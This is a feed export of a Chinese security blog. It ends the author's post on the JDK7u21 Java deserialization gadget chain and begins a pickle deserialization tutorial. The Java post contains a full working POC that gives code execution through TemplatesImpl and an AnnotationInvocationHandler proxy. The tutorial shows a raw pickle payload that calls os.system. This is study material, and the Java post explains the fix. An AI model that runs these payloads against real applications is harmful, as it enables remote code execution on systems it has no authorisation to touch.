class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，在<code>put</code>方法中确实可以触发<code>equals</code>，但是，触发这个<code>equals</code>似乎是有条件的，也就是<code>e.hash == hash</code>成立以及<code>(k = e.key) == key</code>不成立，也就是说这两个对象的<code>hash</code>值要相等且这两个对象不能相等，这样才能触发进<code>key.equals(k)</code></p><p>所以说我们接下来的任务，就是让<code>proxy</code>对象的hash值，等于<code>TemplateImpl</code>对象的hash值</p><h2 id="4-如何构造"><a href="#4-如何构造" class="headerlink" title="4.如何构造"></a>4.如何构造</h2><p>要想让这两个对象的hash值相同，我们首先的先看看hash值是如何计算的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object k)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> h = <span class="number">0</span>;</span><br><span class="line">    h ^= k.hashCode();</span><br><span class="line">    h ^= (h &gt;&gt;&gt; <span class="number">20</span>) ^ (h &gt;&gt;&gt; <span class="number">12</span>);</span><br><span class="line">    <span class="keyword">return</span> h ^ (h &gt;&gt;&gt; <span class="number">7</span>) ^ (h &gt;&gt;&gt; <span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>里面只有一个变量，那就是<code>k.hashCode()</code>，除此之外其它都是一样的，也就是说<code>hash()</code>的计算结果也就取决于<code>k.hashCode()</code>的结果，<code>TemplateImpl</code>中的<code>hashcode()</code>方法每次运行都会发生变化，我们没办法操作，于是乎就只有看看<code>proxy</code>中的<code>hashcode()</code>方法，<code>proxy</code>对象是我们利用动态代理创建的实现类，那么调用它的任何方法都会进入到<code>AnnotationInvocationHandler#invoke</code>中，<code>hashcode()</code>当然也不例外，看看前面的代码，它会调入到<code>this.hashCodeImpl()</code>中，看看这个方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">hashCodeImpl</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> var1 = <span class="number">0</span>;</span><br><span class="line">    Entry var3;</span><br><span class="line">    <span class="keyword">for</span>(Iterator var2 = <span class="keyword">this</span>.memberValues.entrySet().iterator(); var2.hasNext(); </span><br><span class="line">        var1 += <span class="number">127</span> * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())) &#123;</span><br><span class="line">        var3 = (Entry)var2.next();</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> var1;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>解析一下代码，也就是遍历整个Map中每个key和每个value，然后分别计算<code>(127 * key.hashCode()) ^ value.hashCode()</code>，并进行求和；那么假如Map中只有一对键值对，那也就只用执行一次，也就不存在什么遍历了，那么该式就简化为<code>(127 * key.hashCode()) ^ value.hashCode()</code>，那么我们假如<code>key.hashCode()</code>为0，那么任何数<strong>异或0</strong>都为<strong>它本身</strong>，那么该式又简化为<code>value.hashcode()</code>；我们惊奇的发现，这个对象的<code>hashCode</code>，也就等于<code>value.hashcode()</code>，那么我们把<code>value</code>设置成前面那个<code>TemplateImpl</code>对象，<code>proxy</code>对象的hash值不就等于<code>TemplateImpl</code>对象了？不就搞定了吗？！也就是说这个HashMap，键是<code>hashCode()</code>为0的字符串，值是这个<code>TemplateImpl对象</code></p><p>现在我们的目标就是找到一个<code>hashcode</code>为0的字符串，写个脚本遍历就行：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test111</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">long</span> i = <span class="number">0</span>; i &lt; <span class="number">9999999999L</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Long.toHexString(i).hashCode() == <span class="number">0</span>) &#123;</span><br><span class="line">                System.out.println(Long.toHexString(i));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/07/29/XUaZFhsxdoWSYD5.png" alt="image.png"></p><p>跑出来一个字符串：<code>f5a5a608</code>，就它了</p><h2 id="5-思路梳理及POC构造"><a href="#5-思路梳理及POC构造" class="headerlink" title="5.思路梳理及POC构造"></a>5.思路梳理及POC构造</h2><p>前面讲了那么多，现在差不多再把整个思路梳理一遍：</p><ol><li>我们首先生成恶意<code>TemplateImpl</code>对象 ，这个对象是为了遍历它的所有方法并执行，以至于会执行到<code>newTransformer()</code> 或<code>getOutputProperties()</code>方法，进而触发调用链实现命令执行</li><li>然后我们实例化<code>AnnotationInvocationHandler</code>对象，由于是内部类我们需要用反射来获取，然后这个对象的<code>type</code>属性是一个<code>TemplateImpl</code>类，它的<code>memberValues</code>属性是一个<code>Map</code>，<code>Map</code>只有一个<code>key</code>和<code>value</code>，<code>key</code>是字符串<code>f5a5a608</code>，<code>value</code>是前面生成的恶意<code>TemplateImpl</code>对象；这个类也就是我们常说的代理类</li><li>然后对这个 AnnotationInvocationHandler 对象利用<code>Proxy.newProxyInstance</code>动态生成实现类，生成<code>proxy</code>对象</li><li>最后实例化一个<code>HashSet</code>，这个<code>HashSet</code>有两个元素，分别是：恶意<code>TemplateImpl</code>对象和<code>proxy</code>对象，然后将<code>HashSet</code>对象进行序列化和反序列化即可</li></ol><p>照着这个思路，我们可以很轻松的写出代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> java7u21;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.LinkedHashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] serialize(Object o) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        <span class="keyword">return</span> barr.toByteArray();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">unserialize</span><span class="params">(<span class="keyword">byte</span>[] barr)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        TemplatesImpl templates = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;ClassPool.getDefault().get(EvilTemplatesImpl.class.getName()).toBytecode()&#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        String zeroHashCodeStr = <span class="string">&quot;f5a5a608&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 实例化一个map，并添加f5a5a608为key，value先随便设置一个值</span></span><br><span class="line">        HashMap map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        map.put(zeroHashCodeStr, <span class="string">&quot;clyyy&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 实例化AnnotationInvocationHandler类</span></span><br><span class="line">        Constructor handlerConstructor = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        handlerConstructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler tempHandler = (InvocationHandler) handlerConstructor.newInstance(Templates.class, map);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 为tempHandler创造实现类对象</span></span><br><span class="line">        Templates proxy = (Templates) Proxy.newProxyInstance(test.class.getClassLoader(), <span class="keyword">new</span> Class[]&#123;Templates.class&#125;, tempHandler);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 实例化HashSet，并将两个对象放进去</span></span><br><span class="line">        HashSet set = <span class="keyword">new</span> LinkedHashSet();</span><br><span class="line"></span><br><span class="line">        set.add(templates);</span><br><span class="line">        set.add(proxy);<span class="comment">//这个顺序非常重要，不能反着来哈</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将恶意templates设置到map中</span></span><br><span class="line">        map.put(zeroHashCodeStr, templates);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span> []o = serialize(set);</span><br><span class="line"></span><br><span class="line">        unserialize(o);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/07/29/uovD2Wi7Mp1jOyQ.png" alt="image.png"></p><p>成功，看看反序列化触发代码执行的流程：</p><p>首先是触发<code>HashSet</code>的<code>readObject</code>方法，其中使用<code>HashMap</code>的<code>key</code>做去重，将我们的<code>TemplatesImpl</code>对象和<code>proxy</code>对象放到<code>key</code>处，去重时计算这两个元素的<code>hashCode()</code> ，由于我们的构造，这两个元素的<code>hashcode()</code>相等，所以说进而触发<code>proxy</code>的 <code>equals()</code>方法，进入到代理类的对象的<code>invoke</code>方法中，然后调用<code>equalsImpl()</code>方法，在<code>equalsImpl()</code> 中遍历<code>this.type</code>中的每个方法并调用，由于我们的 <code>this.type</code>是<code>TemplatesImpl</code>类，所以触发了<code>newTransform()</code>或<code>getOutputProperties()</code>方法，进而触发任意代码执行</p><p>其实这条链子不太难理解，如果把cc1中的类理清楚，再加上搞清楚动态代理的话，很快就能理解的啦，最后看看它的修复思路吧</p><h2 id="6-修复思路"><a href="#6-修复思路" class="headerlink" title="6.修复思路"></a>6.修复思路</h2><p>之所以7U21能使用，最关键的一点就是由于<code>sun.reflect.annotation.AnnotationInvocationHandler</code>中的<code>this.type</code>属性没有做限制，导致可以是任何对象，但其实在<code>readObject</code>函数中，原本有一个对<code>this.type</code>的检查，在其不是<code>AnnotationType</code>的情况下，会抛出一个异常。但是，捕获到异常后没 有做任何事情，只是将这个函数返回了，这样并不影响整个反序列化的执行过程；在新版中，将 return; 修改成<code>throw new java.io.InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;);</code> ，这样，反序列化时会出现一个异常，导致整个过程停止，我们就不能将<code>this.type</code>属性设置成我们前面说的恶意<code>TemplatesImpl</code>对象了</p><p>只不过p神也说了，这个修复方式看起来击中要害，实际上仍然存在问题，这也导致后面的另一条原生利用链JDK8u20；等p神的文章咯</p><p>参考文章：</p><p><a href="https://y4tacker.blog.csdn.net/article/details/119211849">https://y4tacker.blog.csdn.net/article/details/119211849</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;JDK7u21&quot;&gt;&lt;a href=&quot;#JDK7u21&quot; class=&quot;headerlink&quot; title=&quot;JDK7u21&quot;&gt;&lt;/a&gt;JDK7u21&lt;/h1&gt;&lt;p&gt;好久没写博客了哇，最近放暑假在实习，平时没啥时间写，周末抽时间来写写；Java的原生类反序列化也是一个老考点了，很早之前就简单的学过，只不过那时候没系统总结，过段时间之后就又忘了，这次把它补上；只不过这个漏洞吧，我感觉主要是学它的思路，实际上能用的地儿挺少的，因为它&lt;code&gt;JDK&lt;/code&gt;版本要求必须在7u21之前，这其实是挺苛刻的&lt;/p&gt;</summary>
    
    
    
    
    <category term="Java" scheme="https://arsenetang.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>python篇之pickle反序列化</title>
    <link href="https://arsenetang.github.io/2022/05/23/python%E7%AF%87%E4%B9%8Bpickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://arsenetang.github.io/2022/05/23/python%E7%AF%87%E4%B9%8Bpickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2022-05-22T16:00:00.000Z</published>
    <updated>2022-05-23T05:05:48.881Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pickle反序列化"><a href="#pickle反序列化" class="headerlink" title="pickle反序列化"></a>pickle反序列化</h1><p>好久没更过博客了哈哈哈，最近事儿挺多的，有点儿迷茫，想学的东西太多了，抓不住重点了哈哈，而且国赛也快来了，还得为国赛刷很多的misc题；之前在<code>Y4</code>师傅的博客里面看到过一句话，在迷茫的时候不要停止学习就好啦；接下来总结一下python反序列化中的pickle反序列化，这也是个老知识点了，之前一直欠着没学，借着这波准备国赛就把它总结咯</p><span id="more"></span><h2 id="python反序列化基础"><a href="#python反序列化基础" class="headerlink" title="python反序列化基础"></a>python反序列化基础</h2><p>学过PHP和Java反序列化的朋友应该对反序列化这个词很熟悉了，序列化与反序列化说简单一点儿就是对象与数据的相互转换，这个数据可能是字符串，也可能是字节流；python反序列化当然也不例外，先来讲讲一些基础的函数</p><p>Python中提供<code>pickle</code>和<code>json</code>两个模块来实现序列化和反序列化，这篇文章中我们就讲<code>pickle</code>的反序列化</p><h3 id="1-序列化函数"><a href="#1-序列化函数" class="headerlink" title="1.序列化函数"></a>1.序列化函数</h3><p>序列化函数有<code>dumps()</code>和<code>dump()</code>，这俩的区别就是<code>dumps()</code>只会单纯的将对象序列化，而<code>dump()</code>会在序列化之后将结果写入到文件当中，一般来说我们就用<code>dumps</code>就好了</p><h3 id="2-反序列化函数"><a href="#2-反序列化函数" class="headerlink" title="2.反序列化函数"></a>2.反序列化函数</h3><p>与之相对的就是反序列化函数，同样也有两个，<code>load()</code>和<code>loads()</code>，同样的，<code>loads()</code>也只是单纯的进行反序列化，而<code>load()</code>会将结果写入文件中</p><h3 id="3-测试代码"><a href="#3-测试代码" class="headerlink" title="3.测试代码"></a>3.测试代码</h3><p>举个简单的例子的看看吧：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">People</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,name = <span class="string">&quot;Arsene.Tang&quot;</span></span>):</span></span><br><span class="line">        self.name = name</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">say</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Helloworld&quot;</span>)</span><br><span class="line"></span><br><span class="line">a=People()</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">b=pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line">c=pickle.loads(b)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line">c.say()</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/21/yR3aL7bXvwId1fF.png" alt="image.png"></p><p>以上的代码我是用<code>python 3.7</code>跑的，由于<code>python</code>版本的特殊性，<code>PVM</code>的指令集用的协议有很大的差别，因为默认使用的协议不同，所以说不同的<code>python</code>版本序列化出来的数据是不一样的，从<code>v0</code>版协议到<code>v5</code>版协议，遍布python的各大版本，而我们序列化时是可以指定用<code>v</code>几的版本，加上一个参数<code>protocol</code>就行了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">People</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,name = <span class="string">&quot;Arsene.Tang&quot;</span></span>):</span></span><br><span class="line">        self.name = name</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">say</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Helloworld&quot;</span>)</span><br><span class="line"></span><br><span class="line">a=People()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    <span class="built_in">print</span>(pickle.dumps(a,protocol=i))</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/21/TyqDR6liOCK1gSj.png" alt="image.png"></p><p>既然上面都已经提到指令集用的协议版本差异了，那下面就来看看他们的区别吧，了解了解就好：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">v0版协议是原始的&quot;人类可读&quot;协议, 并且向后兼容早期版本的Python.</span><br><span class="line">v1版协议是较早的二进制格式, 它也与早期版本的Python兼容.</span><br><span class="line">v2版协议是在Python 2.3中引入的, 它为存储new-style class提供了更高效的机制, 参阅PEP 307.</span><br><span class="line">v3版协议添加于Python 3.0, 它具有对bytes对象的显式支持, 且无法被Python 2.x打开, 这是目前默认使用的协议, 也是在要求与其他Python 3版本兼容时的推荐协议.</span><br><span class="line">v4版协议添加于Python 3.4, 它支持存储非常大的对象, 能存储更多种类的对象, 还包括一些针对数据格式的优化, 参阅PEP 3154.</span><br><span class="line">v5版协议添加于Python 3.8, 它支持带外数据, 加速带内数据处理.</span><br></pre></td></tr></table></figure><h2 id="PVM"><a href="#PVM" class="headerlink" title="PVM"></a>PVM</h2><p>上面我们大概了解了<code>pickle</code>反序列化，并且看到了它序列化之后的样子，但是如果真的想看懂它序列化后数据的具体含义，那就得学习<code>PVM</code>了</p><p><code>PVM</code>是指<code>python</code>虚拟机，Python 进程会把编译好的字节码转发到<code>PVM</code>中，序列化和反序列化的过程都是发生在<code>PVM</code>上的</p><h3 id="1-PVM的组成"><a href="#1-PVM的组成" class="headerlink" title="1.PVM的组成"></a>1.PVM的组成</h3><p><code>PVM</code>大概由三个部分组成，第一部分是指令分析器，也就是引擎；第二部分是栈区，主要用于暂存数据流；第三部分是memo区，也就是标签区，作为数据的一个标记吧</p><p>1.引擎的作用</p><p>引擎就相当于发动机嘛，当它从头读取数据流中的操作码和参数时，会根据操作码和参数的内容进行分析，并对其进行处理，在这个过程中改变栈区和标签区，处理结束后到达栈顶，形成反序列化对象并且返回</p><p>2.栈区的作用</p><p>栈区又叫数据暂存区，用于暂存在处理过程中的流数据，在不断的进出栈中实现对数据的反序列化，并最后在栈上生成反序列化的结果</p><p>3.标签区的作用</p><p>这就是数据的一个索引或者说是标记</p><h3 id="2-PVM中的操作码"><a href="#2-PVM中的操作码" class="headerlink" title="2.PVM中的操作码"></a>2.PVM中的操作码</h3><p>PVM中的操作码都是单字节的，先放图，然后下面再来解析它：</p><p><img src="https://s2.loli.net/2022/05/22/41ueIUqVvb8OkZd.png" alt="image.png"></p><p>这个很好理解，<code>S</code>操作码 代表后面这一串是字符串， <code>V</code>操作码 代表后面这一串是<code>unicode</code>编码 ， <code>I</code>操作码 代表后面这一串是整数</p><p><img src="https://s2.loli.net/2022/05/22/wvK5aAVnoOgyPl1.png" alt="image.png"></p><p>这里面比较重要的是<code>(</code>，它相当于做个标记</p><p><img src="https://s2.loli.net/2022/05/22/bVnheErcjud45xQ.png" alt="image.png"></p><p>上面讲的<code>(</code>标记，与<code>l t d s</code>结合使用，就可以将两个标记中的元素取出来放入栈中，<code>d</code>代表是个字典，<code>l</code>代表这元素是个列表，而<code>t</code>代表是个元组，一般元组用的是最多的，举个简单例子：<code>(S&#39;/bin/sh&#39;t</code>，就是说先下个标记，然后把字符串<code>/bin/sh</code>放入栈中，然后遇到了<code>t</code>之后，就会从栈上弹出数据，一直弹到<code>(</code>，也就是将<code>(</code>到<code>t</code>的内容全部弹出来转化成元组，再存入栈中，同时标记消失</p><p><img src="https://s2.loli.net/2022/05/22/x6qP7yCFQlNwUTB.png" alt="image.png"></p><p>这俩指令都挺重要的，c指令后面跟的是模块名和类名，这俩之间用回车作为分割；而<code>R</code>指令一般都在最后，它会将元组和可调用的对象<code>callable</code>从堆栈中弹出来，然后以该元组作为参数调用该<code>callable</code>对象，比如说<code>os.system()</code>中的<code>system()</code>就是一个<code>callable</code>对象</p><p>再补充一个图上没有的操作码<code>.</code>，点号是结束符，执行到这里代表结束</p><h3 id="3-总结"><a href="#3-总结" class="headerlink" title="3.总结"></a>3.总结</h3><p>上面基本上把该介绍的操作码都介绍了，如果还有不完整的大家自行百度搜索哈，接下来就来一个完整的例子来总结：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cos</span><br><span class="line">system</span><br><span class="line">(S&#x27;/bin/ls /&#x27;</span><br><span class="line">tR.</span><br></pre></td></tr></table></figure><p>这应该是最简单的一个例子了，选自<code>k0rz3n</code>师傅的博客，上面这一段就是它序列化后的数据，我们来分析分析：</p><p><code>c</code>后面跟的是模块名，换行之后的是类名，相当于将<code>os.system</code>放入栈中，然后<code>(</code>放入一个标记符，将字符串<code>/bin/ls /</code>放入栈中，然后遇到<code>t</code>，往前弹数据，一直弹到<code>(</code>，相当于将<code>/bin/ls /</code> 的数据都弹出来，然后转换成一个元组再存入栈中，同时标记符消失，最后遇到<code>R</code>，将元组取出来，作为参数放入<code>callable</code>中并执行，也就是说执行了<code>os.system(&#39;/bin/ls /&#39;)</code>：</p><p><img src="https://s2.loli.net/2022/05/22/4At1bMz5frjLvsi.png" alt="image.png"></p><h2 id="漏洞的利用过程"><a href="#漏洞的利用过程" class="headerlink" title="漏洞的利用过程"></a>漏洞的利用过程</h2><p>接下来我们就来看看<code>pickle</code>反序列化漏洞具体的利用过程，因为我们对PHP反序列化相对更加熟悉，所以说我们结合着<code>PHP</code>反序列化来讲，相信会更加容易理解</p><p>无论什么语言，反序列化漏洞出现的前提都是因为我们传入反序列化函数的内容是可控的，相比PHP只能利用代码中存在的类，<code>python</code>就灵活多了，<code>python</code>除了能反序列化当前代码中出现的类，还可以反序列化我们通过<code>import</code>导入的类，还能利用其彻底的面向对象的特性来反序列化使用 types 创建的匿名对象；我是这样理解的，PHP之所以会出现反序列化漏洞是因为它代码本身存在漏洞，我们只是写了一条利用链来调用它而已，而<code>python</code>就不一样了，我们可以告诉它如何进行序列化和反序列化，也就是让它以我们指定的方式进行反序列化，再换句话说就是让它反序列化我们自己写进去的代码，那这就非常完美了啊，相当于反序列化=任意代码执行</p><p>而要实现代码执行的关键，就是一个魔法函数<code>__reduce__</code>，这里得先注意一下，在<code>python2</code>中有两种声明类的方式，分别是新式类(内置类)和旧式类(自建类)，可以看看这篇文章：<a href="http://www.bendawang.site/2017/03/21/python%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0-%E4%B8%80-%EF%BC%9A%E7%B1%BB%E4%B8%8E%E5%85%83%E7%B1%BB%EF%BC%88metaclass%EF%BC%89%E7%9A%84%E7%90%86%E8%A7%A3/">http://www.bendawang.site/2017/03/21/python%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0-%E4%B8%80-%EF%BC%9A%E7%B1%BB%E4%B8%8E%E5%85%83%E7%B1%BB%EF%BC%88metaclass%EF%BC%89%E7%9A%84%E7%90%86%E8%A7%A3/</a>，而假如我们要在<code>python2</code>中使用<code>__reduce__</code>的话，必须得用新式类，也就是下面这种声明方式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">B</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line"><span class="meta">... </span>    <span class="keyword">pass</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = B()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">type</span>(b)</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">__main__</span>.<span class="title">B</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure><p>而在<code>python3</code>中，就都是新式类了，可以直接用</p><h3 id="reduce"><a href="#reduce" class="headerlink" title="reduce"></a>reduce</h3><p>接下来来看<code>__reduce__</code>：</p><p>当序列化和反序列化遇到一无所知的扩展类型的时候，可以通过在类中定义<code>__reduce__</code>的方式来告诉<code>PVM</code>如何进行序列化或反序列化，也就是说我们定义了<code>__reduce__</code>之后，我们就能在序列化的时候让这个类根据我们在<code>__reduce__</code> 